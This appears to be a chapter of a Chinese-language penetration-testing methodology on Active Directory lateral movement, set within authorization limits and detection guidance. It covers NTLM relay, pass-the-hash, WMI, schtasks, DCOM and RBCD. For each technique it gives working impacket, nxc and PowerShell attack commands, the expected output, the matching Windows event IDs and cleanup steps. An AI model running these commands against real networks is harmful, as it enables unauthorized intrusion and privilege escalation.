# 06 横向移动判据（Lateral Movement）

> 范围：已有可用口令 / NTLM hash / 票据，或已能 relay 入站认证，要判断“能不能在目标机器上执行”。
> 前置：授权清单同时包含**源主机、目标主机、目标账号**；同账号认证失败 ≤2 次；写操作/建服务/改对象按单独授权单执行。
> 一句话：横向移动的 `confirmed` 只有一种形态——**目标机器上以预期身份执行了预期命令，且目标侧日志/输出可复算**。
> 配套：`ad-attacks.md`（命令速查）、`05-delegation-and-rbcd.md`（委派/RBCD 属性链）、
> `04-walkthrough-windows-auth-events.md`（4624/4625/4672/4768/4769 读法）。

## 0. 统一证据模型（先写清“谁在谁的机器上”）

| 要素 | 必填内容 | 常见错误 |
| :-- | :-- | :-- |
| 源 | 发起方主机名/IP、执行账号、工具与命令行 | 只写“用 nxc 打了过去”，无法区分是从跳板机还是工作站发起 |
| 动作 | 协议 + 目标端口 + 认证方式（NTLM/Kerberos/票据） | 把“认证成功”当成“命令执行成功” |
| 目标 | 目标主机名/IP、被冒用身份、落地进程/服务/任务名 | 不记录目标侧进程父子关系，无法和 4688 对齐 |
| 结果 | 目标侧命令输出（`whoami`/文件内容）、退出码、时间 | 只保存攻击端回显，目标侧日志缺失 |
| 日志 | 目标 4624/4625/4672/4688/7045/4698、DC 4768/4769/5136、断档说明 | 用单条 4624 证明“横向成功” |
| 清理 | 服务/任务/文件/对象属性的删除命令与回读结果 | 建了服务或 RBCD 不清理，留下持久化后门 |

结论口径：认证成功但无目标侧执行证据 → `candidate`；目标拒绝/签名强制/无权限 → `blocked`；
目标侧有进程/输出且身份符合预期 → `confirmed`。

## 1. 四列判据总表（前置 → 可机检判据 → 失败判据 → 代价）

> 四列 = **前置条件 → 可机检判据 → 失败判据 → 代价**（最左的手法名只用于定位）。
> “可机检判据”列按 **攻击端命令输出 + 目标端日志字段** 双写，并写明“谁在谁的机器上”；只有一边成立时最高只能写 `candidate`。
> 事件字段说明见 `04-walkthrough-windows-auth-events.md`。

| 手法 | 前置条件 | 可机检判据（谁在谁的机器上执行了什么 / 日志或命令输出） | 失败判据 | 代价 |
| :-- | :-- | :-- | :-- | :-- |
| NTLM relay → SMB（445） | 目标未强制 SMB signing；能诱导受害者（机器/用户）向攻击端认证；攻击端 445 可监听；relay 身份在目标有本地管理员或可写共享 | 攻击端 `ntlmrelayx -t smb://<target>` 出现 `Authenticating against smb://<target> as <DOMAIN>/<user> SUCCEED`；目标 `<target>` 侧 4624 `LogonType=3` + 4776（NTLM）+ 4672（管理员）；建服务时 7045/4697，命令执行时 4688（父进程 `services.exe`）；`-c whoami` 有回显 | `SMB signing: True`；`STATUS_ACCESS_DENIED`；`Authenticating ... FAILED`；认证成功但目标无 4624/7045/4688；relay 到低权账号无写权限 | 高噪音（7045/4697/4688 三连）；强制认证可能触发业务告警；建服务不清理=持久化；需单独授权强制认证 |
| NTLM relay → WinRM（5985/5986） | 目标 WinRM 用 NTLM 且未强制 Kerberos；5985/5986 可达；攻击端能 relay HTTP | 攻击端 `ntlmrelayx -t http://<target>:5985/wsman` 可能打印 `Authenticating ... SUCCEED`；**但没有命令回显**；目标 4624 类型 3 + 4776，WinRM Operational 日志有会话记录 | 认证后无 shell（WinRM 要求消息签名/加密，relay 无法派生会话密钥，属默认行为）；`401/403`；目标只收 Kerberos | 低产出、易误报：把 `SUCCEED` 写成“WinRM 已横向”是典型错误；每次尝试都留 4624/4776 |
| NTLM relay → LDAPS（636） | DC 的 LDAPS 可达；**EPA/通道绑定未强制**（LDAP 389 则是 LDAP signing 未强制）；能诱导 DC 机器账号或高权用户认证；relay 身份有目录写权限 | 攻击端 `ntlmrelayx -t ldaps://<dc> --add-computer` 返回 `Adding computer account ...` 或 `Delegation rights modified successfully`；回读 `ldapsearch` 看到新计算机对象或 `msDS-AllowedToActOnBehalfOfOtherIdentity` 含受控 SID；DC 侧 4624 类型 3 + 4776 + 5136（目录对象修改）/4662 | `LDAP signing required`、`strong(er) auth required`、`unwilling to perform`、`invalidCredentials`；EPA 开启导致通道绑定失败；认证成功但写被 ACL 拒绝 | 直接改 AD 对象，必须先授权并备份原值；5136 是高保真告警；不清理 RBCD 等于留后门 |
| Pass-the-Hash（SMB/WMI/WinRM） | 拿到 NTLM hash（SAM/LSA/ntds）；目标接受 NTLM（非 Kerberos-only、账号不在 Protected Users）；hash 对应目标本地管理员或域高权 | 攻击端 `nxc smb <target> -u <user> -H <hash> -d <dom>` 输出 `[+] ... (Pwn3d!)`；`wmiexec/smbexec` 回显 `whoami`；目标 4624 类型 3 + 4776，管理员再加 4672；失败侧 4625 | `STATUS_LOGON_FAILURE`、`STATUS_ACCOUNT_RESTRICTION`、`STATUS_NOT_SUPPORTED`（目标只收 Kerberos）；Protected Users 拒绝 NTLM；hash 属于机器账号且已轮换 | hash 在口令轮换前长期有效；4776/4625 可检测；无明文但等同凭据，必须按凭据红线保管 |
| WMI（135 + 动态 RPC） | 目标本地管理员凭据/hash；RPC 135 与动态端口可达；WMI 服务运行；防火墙放行 | 攻击端 `wmiexec <dom>/<user>@<target>` 返回命令输出；或 `wmic /node:<target> process call create ...` 返回 `ReturnValue = 0` + `ProcessId`；目标 4624 类型 3、4688（父进程 `WmiPrvSE.exe`）、4672 | `Access is denied`、`0x80070005`、`rpc_s_access_denied`、135/动态端口被防火墙拦截；hash 非管理员 | 4688 父进程特征明显，EDR 高命中；进程短暂但留遥测；无需落盘即可执行 |
| schtasks（RPC/Task Scheduler） | 目标管理员或被授予计划任务管理权限；Task Scheduler 服务运行；RPC/SMB 可达 | 攻击端 `schtasks /s <target> /u <dom>\<user> /p <pass> /create /tn <name> /tr "cmd /c whoami > C:\Windows\Temp\<f>" /sc once /st 00:00` 返回 `SUCCESS: ... successfully been created.`；`/query` 能列出；目标 4698（创建）、4624 类型 3、4688（动作）、4699/4700/4702（删除/运行/结束） | `ERROR: Access is denied.`、`The RPC server is unavailable`、任务创建但不运行（`/ru`/登录类型不对）、目标已禁用 Task Scheduler | 4698 是高保真检测；任务必须 `/delete` 并核对 4699；比 WMI 慢，适合需要“落地命令”的场景 |
| DCOM（135 + DCOM 对象） | 目标管理员；RPC 135 可达；目标注册了可用 DCOM 对象（MMC20.Application / ShellWindows / ShellBrowserWindow）；部分对象要求交互会话 | 攻击端 PowerShell `[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','<target>'))` 不抛异常，`ExecuteShellCommand` 后目标出现进程；目标 4624 类型 3、4688（父进程 `mmc.exe`/`dllhost.exe`）、4672 | `0x80070005`、`0x80080005`（服务器执行失败）、对象未注册、防火墙拦截、目标无交互会话 | 版本/补丁差异大，成功率不稳定；4688 父子关系可检测；不落盘但留进程遥测 |
| RBCD（写目标计算机对象） | 对目标计算机对象 `msDS-AllowedToActOnBehalfOfOtherIdentity` 有写权限；有可控账号（最好带 SPN）；目标允许协议转换；时钟同步 | 写入命令返回成功 + 回读属性含受控账号 SID；`getST -spn cifs/<target> -impersonate administrator` 返回服务票据；`wmiexec -k` 回显目标身份；DC 4769（服务名=目标 SPN）+ 5136（属性写）；目标 4624 类型 3 | 写返回 `ACCESS_DENIED`；`KDC_ERR_BADOPTION`（协议转换/SPN 不匹配）；可控账号无 SPN；票据拿到但目标拒绝服务 | 域对象写操作，需单独授权、先备份原值；不清理=持久化；5136 高保真；细节见 `05-delegation-and-rbcd.md` |

## 2. 逐项：命令、期望输出、目标侧对照

### 2.1 NTLM relay → SMB

```bash
# 先只读确认签名面（不认证）
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
# relay（授权内；-c 用只读命令，避免落地文件）
impacket-ntlmrelayx -t smb://<target> -smb2support -c 'whoami'
```

- 期望：`Authenticating against smb://<target> as <DOMAIN>/<user> SUCCEED`，随后 `whoami` 回显。
- 目标侧：4624 类型 3（账号/来源 IP）+ 4776；管理员身份再加 4672；建服务时 7045/4697。
- 判据：**目标侧 4624 与攻击端回显同时存在**，且账号是预期身份。只有 `SUCCEED` 没回显 → `candidate`。
- 注意：relay 的目标 `-t` 与受害者（强制认证来源）不是同一台；报告里必须写清两台主机。

### 2.2 NTLM relay → WinRM

```bash
impacket-ntlmrelayx -t http://<target>:5985/wsman
```

- 期望：可能出现 `Authenticating against http://<target>:5985 SUCCEED`，但**没有命令输出**。
- 失败判据：认证后无 shell（WinRM 消息签名/加密需要会话密钥，relay 不具备）；`401/403`；目标只收 Kerberos。
- 结论：默认环境中这条路径应写 `blocked`，不要因为 `SUCCEED` 写“WinRM 横向成功”。
  只有在目标显式关闭消息保护或存在其它可 relay 的 HTTP 管理端点时，才重新评估。

### 2.3 NTLM relay → LDAPS

```bash
# 只读确认 LDAP 面（有授权账号时）
nxc ldap <dc> -u <user> -p '<pass>' -M ldap-checker
# relay 到 LDAPS：加计算机对象 / 改 RBCD（写操作，需单独授权）
impacket-ntlmrelayx -t ldaps://<dc> --add-computer EVIL$ --delegate-access
# 回读（只读）
ldapsearch -x -H "ldaps://<dc>" -D "<user>@<domain>" -w '<pass>' \
  -b "dc=<domain>" '(objectClass=computer)' dn msDS-AllowedToActOnBehalfOfOtherIdentity
```

- 期望：`Adding computer account ...` / `Delegation rights modified successfully`；回读属性含受控账号 SID。
- DC 侧：4624 类型 3 + 4776 + 5136（对象修改）；4662（目录访问，需 DS Access 审计）。
- 失败判据：`LDAP signing required`、`strong(er) auth required`、`unwilling to perform`、EPA 通道绑定失败。
- 结论：能写对象且回读一致 → `candidate` 起步；再用 `getST + wmiexec` 拿到目标执行才算 `confirmed`。

### 2.4 Pass-the-Hash

```bash
nxc smb <target> -u <user> -H '<NTLM>' -d <domain>
impacket-wmiexec <domain>/<user>@<target> -hashes ':<NTLM>' 'whoami /all'
```

- 期望：`[+] <target>\<user> (Pwn3d!)`；远程 `whoami /all` 显示目标身份与特权。
- 目标侧：4624 类型 3 + 4776；管理员再加 4672；失败 4625。
- 失败判据：`STATUS_LOGON_FAILURE` / `STATUS_ACCOUNT_RESTRICTION` / Protected Users / 目标只收 Kerberos
  → 立即停，换账号或换协议，不重复试。
- 代价：hash 在口令轮换前一直有效；按凭据红线只留指纹。

### 2.5 WMI

```bash
impacket-wmiexec <domain>/<user>@<target> -hashes ':<NTLM>' 'whoami'
# 或（Windows 侧）
wmic /node:<target> /user:<domain>\<user> /password:'<pass>' process call create "cmd /c whoami > C:\Windows\Temp\w.txt"
```

- 期望：`NT AUTHORITY\SYSTEM` 或目标账号；`wmic` 返回 `ReturnValue = 0` 与 `ProcessId`。
- 目标侧：4688 的父进程是 `WmiPrvSE.exe`；4624 类型 3；管理员 4672。
- 失败判据：`Access is denied`、`0x80070005`、RPC 端口不可达、hash 非管理员。
- 注意：`ReturnValue=0` 只证明“创建请求成功”，要读回目标文件/输出才算 `confirmed`。

### 2.6 schtasks

```bash
schtasks /s <target> /u <domain>\<user> /p '<pass>' \
  /create /tn 'SeepCheck' /tr "cmd /c whoami > C:\Windows\Temp\seep.txt" /sc once /st 00:00
schtasks /s <target> /u <domain>\<user> /p '<pass>' /query /tn 'SeepCheck'
schtasks /s <target> /u <domain>\<user> /p '<pass>' /delete /tn 'SeepCheck'
```

- 期望：`SUCCESS: The scheduled task "SeepCheck" has successfully been created.`；`/query` 能列出。
- 目标侧：4698（创建）+ 4624 类型 3 + 4688（动作）+ 4699（删除）。
- 失败判据：`Access is denied`、`RPC server is unavailable`、任务不运行（`/ru` 或登录类型不对）。
- 代价：4698 高保真；必须删除任务并核对 4699，否则算持久化。

### 2.7 DCOM

```powershell
$c = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','<target>'))
$c.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami > C:\Windows\Temp\seep.txt','7')
```

- 期望：无异常，目标出现 `cmd.exe` 子进程；目标 4688 父进程 `mmc.exe`。
- 失败判据：`0x80070005`、`0x80080005`、对象未注册、无交互会话、防火墙拦截。
- 代价：跨版本成功率不稳；4688 可检测；不落盘但留进程遥测。

### 2.8 RBCD（横向视角）

```bash
python rbcd.py -delegate-from '<controlled$>' -delegate-to '<target>$' \
  -action write '<domain>/<user>:<pass>' -dc-ip <dc>
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  '<domain>/<controlled$>:<pass>' -dc-ip <dc>
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass '<domain>/administrator@<target>' 'whoami'
```

- 期望：写入成功；回读 `msDS-AllowedToActOnBehalfOfOtherIdentity` 含受控 SID；`getST` 出票；`whoami` 回显目标。
- DC 侧：5136（属性写）+ 4769（服务票据）；目标侧 4624 类型 3。
- 失败判据：写 `ACCESS_DENIED`、`KDC_ERR_BADOPTION`、可控账号无 SPN、票据可用但目标拒绝服务。
- 代价：域对象写 + 可能持久化；必须备份原值并清理；细节与属性表见 `05-delegation-and-rbcd.md`。

## 3. 事件对照表（目标侧 / DC 侧）

| 手法 | 目标主机 | DC | 备注 |
| :-- | :-- | :-- | :-- |
| relay → SMB | 4624 类型 3、4776、4672、7045/4697、4688（父 `services.exe`） | 若 relay 的是域账号，可能有 4768/4769 | SMB signing 决定可行性 |
| relay → WinRM | 4624 类型 3、4776；WinRM Operational 会话记录 | 同上 | 默认无命令执行 |
| relay → LDAPS | —（目标就是 DC） | 4624 类型 3、4776、5136、4662 | EPA/通道绑定决定可行性 |
| PtH | 4624 类型 3、4776、4672；失败 4625 | 4768/4769（若后续用 Kerberos） | Protected Users 直接拒绝 |
| WMI | 4624 类型 3、4688（父 `WmiPrvSE.exe`）、4672 | 可选 | 4688 是主证据 |
| schtasks | 4698、4624 类型 3、4688、4699/4700/4702 | 可选 | 4698 高保真 |
| DCOM | 4624 类型 3、4688（父 `mmc.exe`/`dllhost.exe`）、4672 | 可选 | 对象可用性因版本而异 |
| RBCD | 4624 类型 3 | 5136、4769 | 写属性需授权与回滚 |

## 4. 路径选择顺序与预算

1. **先只读**：`nxc smb -u '' -p ''` 看签名/域/OS；`ldapsearch` 看 rootDSE；不认证、不写。
2. **按噪音从低到高**：WinRM（默认还会失败）→ WMI → SMB（`-c` 只读命令）→ schtasks/DCOM（会落地/建对象）。
3. **同账号失败 2 次即停**，换账号或换协议；不要用“再试一次”跨过锁定阈值。
4. **写操作单列**：relay 到 LDAPS、RBCD、建服务、计划任务、DCOM 都要单独授权 + 备份 + 清理。
5. **每条路径只留一个 `confirmed` 证据包**：源、动作、目标、输出、日志、时间、清理。

## 5. 清理与证据包

```text
路径：<手法>
源：<attacker_host> / <user> / <tool + args>
目标：<target_host> / <identity> / <process|service|task>
命令与 rc：<cmd>（rc=0）
攻击端输出：<whoami / 文件内容 / ReturnValue>
目标侧日志：<EventID + 账号 + 来源 IP + 时间>
清理：<schtasks /delete | sc delete | rbcd restore | 删除文件>（rc=0，回读已消失）
结论：confirmed / candidate / blocked
```

- 建服务：`sc \\<target> delete <svc>`，核对 7045 之后没有残留服务；
- 计划任务：`schtasks /delete`，核对 4699；
- RBCD：写回原安全描述符并 `ldapsearch` 回读；
- 临时文件：删除并记录路径；
- 票据/证书/hash：只留指纹，不落盘。

## 6. 失败判据速查（看到即降级）

| 现象 | 判定 | 改走哪条 | 代价 |
| :-- | :-- | :-- | :-- |
| 认证 `SUCCEED` 但目标无 4624/4688/7045 | 只证明 relay 握手，不证明执行 | 换 WMI/schtasks，或补目标侧日志 | 重跑一次仍无日志就是路径不通 |
| `SMB signing: True` / `LDAP signing required` / EPA 开启 | relay 面关闭 | 转 ADCS、凭据直连或 ACL 路径 | 继续尝试只会刷失败日志 |
| `STATUS_LOGON_FAILURE` / `STATUS_ACCOUNT_RESTRICTION` | 凭据/协议被拒 | 换账号、换 NTLM→Kerberos，或停 | 触发锁定与告警 |
| `Access is denied` / `0x80070005` | ACL/权限不足 | 换目标或走 ACL/委派提权 | 重复写会触发审计 |
| hash 非管理员、目标只收 Kerberos | PtH 不成立 | 找本地管理员复用或转票据 | 时间与告警成本 |
| RBCD 写入成功但 `KDC_ERR_BADOPTION` | 协议转换/SPN 不匹配 | 换目标 SPN 或转 ADCS | 已写对象必须清理 |
| 目标日志断档 / 单机无 4768/4769 | 遥测不可信或非域 | 补 DC 日志/审计策略 | 不能据此写“未发生” |
| 同一手法同参数连续失败两次 | 路径大概率不通 | 按本表换面 | 继续堆时间=负收益 |

## 7. 边界

- 只在授权清单内的源/目标主机上执行；跨网段、跨域、跨租户一律先补授权。
- 强制认证、relay、写 AD 对象、建服务/任务属于高影响动作：单独授权单 + 备份 + 回滚登记。
- 不默认持久化；测试服务/任务/对象属性必须清理并回读确认。
- 口令/hash/票据/证书私钥只留指纹；目标侧日志导出前脱敏账号与来源 IP。
- 不把“协议握手成功”“属性存在”“工具打印 SUCCEED”写成横向移动成功。
